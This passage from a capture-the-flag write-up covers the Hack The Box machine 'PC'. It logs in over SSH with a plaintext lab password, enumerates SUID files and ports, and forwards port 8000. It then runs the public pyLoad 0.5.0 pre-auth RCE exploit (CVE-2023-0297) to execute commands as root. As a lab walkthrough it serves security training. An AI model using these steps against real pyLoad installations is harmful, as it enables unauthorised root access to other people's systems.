<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="p">@</span><span class="n">kali$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="n">sau</span><span class="mf">@10.10.11.214</span>
<span class="n">sau</span><span class="mf">@10.10.11.214</span><span class="err">'</span><span class="n">s</span><span class="w"> </span><span class="n">password</span><span class="o">:</span><span class="w"> </span>
<span class="n">Last</span><span class="w"> </span><span class="n">login</span><span class="o">:</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">13</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mo">05</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="mf">10.10.16.3</span>
<span class="n">sau</span><span class="p">@</span><span class="n">pc</span><span class="o">:~</span><span class="n">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

By providing the password <code>HereIsYourPassWord1431</code> to authenticate as the user <code>sau</code>, it allows us to connect via the SSH service.<br/><br/>
Once inside the system as the user <code>sau</code>, we can view the first flag:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span>
<span class="n">b356e</span><span class="o">**********************</span><span class="mi">3</span><span class="n">a985</span>
<span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

Before continuing with privilege escalation, I recommend exporting the <code>TERM</code> environment variable to the value <code>xterm</code> to enable more comfortable interaction in the console.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">sau</span><span class="err">@</span><span class="n">pc</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="k">export</span><span class="w"> </span><span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="n">sau</span><span class="err">@</span><span class="n">pc</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>
<h3><br>Shell as root</br></h3><br>
As <code>sau</code>, we can try listing our sudo privileges since we have their password:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span>
<span class="o">[</span><span class="n">sudo</span><span class="o">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nl">sau</span><span class="p">:</span><span class="w"> </span>
<span class="n">Sorry</span><span class="p">,</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="n">sau</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">localhost</span><span class="p">.</span>
<span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

Nothing interesting here.<br/><br/>
We can attempt to list <code>Set-UID</code> files using the <code>find</code> command:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">perm</span><span class="w"> </span><span class="o">-</span><span class="mi">4000</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span>
<span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">snapd</span><span class="o">/</span><span class="mi">17950</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">snapd</span><span class="o">/</span><span class="n">snap</span><span class="o">-</span><span class="n">confine</span>
<span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">core20</span><span class="o">/</span><span class="mi">1778</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">chfn</span>
<span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">core20</span><span class="o">/</span><span class="mi">1778</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">chsh</span>
<span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">core20</span><span class="o">/</span><span class="mi">1778</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">gpasswd</span>
<span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">core20</span><span class="o">/</span><span class="mi">1778</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mount</span>
<span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">core20</span><span class="o">/</span><span class="mi">1778</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">newgrp</span>
<span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">core20</span><span class="o">/</span><span class="mi">1778</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">passwd</span>
<span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">core20</span><span class="o">/</span><span class="mi">1778</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">su</span>
<span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">core20</span><span class="o">/</span><span class="mi">1778</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sudo</span>
<span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">core20</span><span class="o">/</span><span class="mi">1778</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">umount</span>
<span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">core20</span><span class="o">/</span><span class="mi">1778</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
<span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">core20</span><span class="o">/</span><span class="mi">1778</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">policykit</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="n">polkit</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">helper</span><span class="o">-</span><span class="mi">1</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">eject</span><span class="o">/</span><span class="n">dmcrypt</span><span class="o">-</span><span class="k">get</span><span class="o">-</span><span class="n">device</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">snapd</span><span class="o">/</span><span class="n">snap</span><span class="o">-</span><span class="n">confine</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="k">at</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">su</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">passwd</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">chfn</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">fusermount</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">newgrp</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mount</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">chsh</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sudo</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">umount</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">gpasswd</span>
<span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

But there aren't any potential files we can exploit.<br/><br/>
If we examine the open ports on the system, we can see that port <code>8000</code> is open:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ss</span><span class="w"> </span><span class="o">-</span><span class="n">nltp</span>
<span class="k">State</span><span class="w">          </span><span class="n">Recv</span><span class="o">-</span><span class="n">Q</span><span class="w">         </span><span class="n">Send</span><span class="o">-</span><span class="n">Q</span><span class="w">                 </span><span class="k">Local</span><span class="w"> </span><span class="nl">Address</span><span class="p">:</span><span class="n">Port</span><span class="w">                  </span><span class="n">Peer</span><span class="w"> </span><span class="nl">Address</span><span class="p">:</span><span class="n">Port</span><span class="w">        </span><span class="n">Process</span><span class="w">        </span>
<span class="n">LISTEN</span><span class="w">         </span><span class="mi">0</span><span class="w">              </span><span class="mi">4096</span><span class="w">                   </span><span class="mf">127.0.0.53</span><span class="o">%</span><span class="nl">lo</span><span class="p">:</span><span class="mi">53</span><span class="w">                         </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="o">*</span><span class="w">                          </span>
<span class="n">LISTEN</span><span class="w">         </span><span class="mi">0</span><span class="w">              </span><span class="mi">128</span><span class="w">                          </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="mi">22</span><span class="w">                         </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="o">*</span><span class="w">                          </span>
<span class="n">LISTEN</span><span class="w">         </span><span class="mi">0</span><span class="w">              </span><span class="mi">5</span><span class="w">                          </span><span class="mf">127.0.0.1</span><span class="err">:</span><span class="mi">8000</span><span class="w">                       </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="o">*</span><span class="w">                          </span>
<span class="n">LISTEN</span><span class="w">         </span><span class="mi">0</span><span class="w">              </span><span class="mi">128</span><span class="w">                          </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="mi">9666</span><span class="w">                       </span><span class="mf">0.0.0.0</span><span class="err">:</span><span class="o">*</span><span class="w">                          </span>
<span class="n">LISTEN</span><span class="w">         </span><span class="mi">0</span><span class="w">              </span><span class="mi">128</span><span class="w">                             </span><span class="o">[</span><span class="n">::</span><span class="o">]</span><span class="err">:</span><span class="mi">22</span><span class="w">                            </span><span class="o">[</span><span class="n">::</span><span class="o">]</span><span class="err">:</span><span class="o">*</span><span class="w">                          </span>
<span class="n">LISTEN</span><span class="w">         </span><span class="mi">0</span><span class="w">              </span><span class="mi">4096</span><span class="w">                               </span><span class="o">*</span><span class="err">:</span><span class="mi">50051</span><span class="w">                            </span><span class="o">*</span><span class="err">:</span><span class="o">*</span><span class="w">                          </span>
<span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span>
</code></pre><br style="line-height: 0.5;"/></div>

If we attempt to make a GET request to the port using CURL, we see the following:<br/><br/>
<div class="codehilite"><pre><span></span><code>sau@pc:~$<span class="w"> </span>curl<span class="w"> </span>localhost:8000
<span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span><span class="w"> </span><span class="na">lang=</span><span class="s">en</span><span class="nt">&gt;</span>
<span class="nt">&lt;title&gt;</span>Redirecting...<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;h1&gt;</span>Redirecting...<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>You<span class="w"> </span>should<span class="w"> </span>be<span class="w"> </span>redirected<span class="w"> </span>automatically<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>URL:<span class="w"> </span><span class="nt">&lt;a</span><span class="w"> </span><span class="na">href=</span><span class="s">"/login?next=http%3A%2F%2Flocalhost%3A8000%2F"</span><span class="nt">&gt;</span>/login?next=http%3A%2F%2Flocalhost%3A8000%2F<span class="nt">&lt;/a&gt;</span>.<span class="w"> </span>If<span class="w"> </span>not,<span class="w"> </span>click<span class="w"> </span>the<span class="w"> </span>link.
sau@pc:~$<span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

I believe it belongs to a web service, so firstly, I'm going to set up port forwarding. I want to access it using my browser.<br/><br/>
We can establish port forwarding using <code>ssh</code> by using the <code>-L</code> parameter:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="p">@</span><span class="n">kali$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="n">sau</span><span class="mf">@10.10.11.214</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="mi">8000</span><span class="o">:</span><span class="mf">127.0.0.1</span><span class="o">:</span><span class="mi">8000</span>
<span class="n">sau</span><span class="mf">@10.10.11.214</span><span class="err">'</span><span class="n">s</span><span class="w"> </span><span class="n">password</span><span class="o">:</span><span class="w"> </span>
<span class="n">Last</span><span class="w"> </span><span class="n">login</span><span class="o">:</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">13</span><span class="o">:</span><span class="mi">49</span><span class="o">:</span><span class="mi">15</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="mf">10.10.16.3</span>
<span class="n">sau</span><span class="p">@</span><span class="n">pc</span><span class="o">:~</span><span class="n">$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

If the port forwarding executed correctly, we should be able to access port <code>8000</code> through our browser using our local IP address.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pc/img/18.png"/><br/><br/>
We observe that we executed the port forwarding correctly and managed to access the web server hosted on port <code>8000</code> of the victim machine.<br/><br/>
At first glance, we can see that <code>pyLoad</code> is being used.<br/><br/>
PyLoad is an open-source download manager that allows users to download files from the Internet more efficiently and conveniently. It is designed to automate the process of downloading files from various cloud hosting services, websites, and other online resources.<br/><br/>
With this information in mind, we can search for vulnerabilities associated with this service using <code>searchsploit</code>:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="c">elswix@kali$ searchsploit pyLoad</span>
<span class="nb">-----------------------------------------------------------------------------------------------</span><span class="c"> </span><span class="nb">---------------------------------</span>
<span class="c"> Exploit Title                                                                                 |  Path</span>
<span class="nb">-----------------------------------------------------------------------------------------------</span><span class="c"> </span><span class="nb">---------------------------------</span>
<span class="c">PyLoad 0</span><span class="nt">.</span><span class="c">5</span><span class="nt">.</span><span class="c">0 </span><span class="nb">-</span><span class="c"> Pre</span><span class="nb">-</span><span class="c">auth Remote Code Execution (RCE)                                            | python/webapps/51532</span><span class="nt">.</span><span class="c">py</span>
<span class="nb">-----------------------------------------------------------------------------------------------</span><span class="c"> </span><span class="nb">---------------------------------</span>
<span class="c">Shellcodes: No Results</span>
</code></pre><br style="line-height: 0.5;"/></div>

There is a vulnerability associated with version <code>0.5.0</code> of <code>pyLoad</code>. At this point, we don't know which version of <code>pyLoad</code> we are dealing with. We can attempt to list the version within the system:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">sau</span><span class="err">@</span><span class="n">pc</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">pyload</span><span class="w"> </span><span class="o">--</span><span class="n">version</span>
<span class="n">pyLoad</span><span class="w"> </span><span class="mf">0.5</span><span class="o">.</span><span class="mi">0</span>
<span class="n">sau</span><span class="err">@</span><span class="n">pc</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

It seems we may be able to exploit this vulnerability. First, I will download the exploit to my attacker machine:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">searchsploit</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">python</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="mf">51532.</span><span class="n">py</span>
<span class="w">  </span><span class="nl">Exploit</span><span class="p">:</span><span class="w"> </span><span class="n">PyLoad</span><span class="w"> </span><span class="mf">0.5.0</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Pre</span><span class="o">-</span><span class="n">auth</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="n">Code</span><span class="w"> </span><span class="n">Execution</span><span class="w"> </span><span class="p">(</span><span class="n">RCE</span><span class="p">)</span>
<span class="w">      </span><span class="nl">URL</span><span class="p">:</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">exploits</span><span class="o">/</span><span class="mi">51532</span>
<span class="w">     </span><span class="k">Path</span><span class="err">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">exploitdb</span><span class="o">/</span><span class="n">exploits</span><span class="o">/</span><span class="n">python</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="mf">51532.</span><span class="n">py</span>
<span class="w">    </span><span class="nl">Codes</span><span class="p">:</span><span class="w"> </span><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">0297</span>
<span class="w"> </span><span class="nl">Verified</span><span class="p">:</span><span class="w"> </span><span class="k">True</span>
<span class="k">File</span><span class="w"> </span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="n">Python</span><span class="w"> </span><span class="n">script</span><span class="p">,</span><span class="w"> </span><span class="nf">ASCII</span><span class="w"> </span><span class="nc">text</span><span class="w"> </span><span class="n">executable</span>
<span class="n">Copied</span><span class="w"> </span><span class="k">to</span><span class="err">:</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">PC</span><span class="o">/</span><span class="n">content</span><span class="o">/</span><span class="mf">51532.</span><span class="n">py</span>
</code></pre><br style="line-height: 0.5;"/></div>

When running the exploit, it requests two parameters:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="mf">51532.</span><span class="n">py</span>
<span class="k">usage</span><span class="err">:</span><span class="w"> </span><span class="mf">51532.</span><span class="n">py</span><span class="w"> </span><span class="o">[</span><span class="n">-h</span><span class="o">]</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="n">CMD</span>
<span class="mf">51532.</span><span class="nl">py</span><span class="p">:</span><span class="w"> </span><span class="nl">error</span><span class="p">:</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">arguments</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="nl">required</span><span class="p">:</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="n">c</span>
</code></pre><br style="line-height: 0.5;"/></div>

We need to specify a URL and the command we want to execute on the victim machine:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="mf">51532.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">8000</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="n">whoami</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nl">alive</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">8000</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Host</span><span class="w"> </span><span class="n">up</span><span class="p">,</span><span class="w"> </span><span class="n">let</span><span class="err">'</span><span class="n">s</span><span class="w"> </span><span class="n">exploit</span><span class="err">!</span><span class="w"> </span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">exploit</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">executeded</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">machine</span><span class="p">.</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

In the previous command, we specified a URL that points to our local machine on port <code>8000</code>. Remember that when we access this address, it redirects us to port <code>8000</code> on the victim machine, which we achieved through port forwarding.<br/><br/>
We don't see any output from the command; it appears to execute locally and doesn't display the result. We can verify this by creating a file in the <code>/tmp</code> directory of the victim machine:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="mf">51532.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">8000</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">'echo thisisatest &gt; /tmp/test'</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nl">alive</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="nl">localhost</span><span class="p">:</span><span class="mi">8000</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Host</span><span class="w"> </span><span class="n">up</span><span class="p">,</span><span class="w"> </span><span class="n">let</span><span class="err">'</span><span class="n">s</span><span class="w"> </span><span class="n">exploit</span><span class="err">!</span><span class="w"> </span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">exploit</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">executeded</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">machine</span><span class="p">.</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

If we list the contents of the <code>/tmp</code> directory on the victim machine, we see the following:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">sau</span><span class="nv">@pc</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span>
<span class="n">total</span><span class="w"> </span><span class="mi">36</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">12</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="n">pyLoad</span>
<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">12</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="n">snap</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="n">tmp</span>
<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">12</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">856</span><span class="n">ca6a112564b7c9ac3717b1bd6a3cb</span><span class="o">-</span><span class="n">ModemManager</span><span class="p">.</span><span class="n">service</span><span class="o">-</span><span class="n">f19juj</span>
<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">12</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">856</span><span class="n">ca6a112564b7c9ac3717b1bd6a3cb</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">logind</span><span class="p">.</span><span class="n">service</span><span class="o">-</span><span class="n">rBl33f</span>
<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">12</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="n">systemd</span><span class="o">-</span><span class="n">private</span><span class="o">-</span><span class="mi">856</span><span class="n">ca6a112564b7c9ac3717b1bd6a3cb</span><span class="o">-</span><span class="n">systemd</span><span class="o">-</span><span class="n">resolved</span><span class="p">.</span><span class="n">service</span><span class="o">-</span><span class="n">bUBlUe</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">   </span><span class="mi">12</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">14</span><span class="err">:</span><span class="mi">16</span><span class="w"> </span><span class="n">test</span>
<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">sau</span><span class="w">  </span><span class="n">sau</span><span class="w">  </span><span class="mi">4096</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">14</span><span class="err">:</span><span class="mi">09</span><span class="w"> </span><span class="n">tmpdtqaw9an</span>
<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">12</span><span class="err">:</span><span class="mi">07</span><span class="w"> </span><span class="n">tmpulvqwyu6</span>
<span class="n">drwx</span><span class="o">------</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Oct</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="mi">12</span><span class="err">:</span><span class="mi">08</span><span class="w"> </span><span class="n">vmware</span><span class="o">-</span><span class="n">root_734</span><span class="o">-</span><span class="mi">2991268422</span>
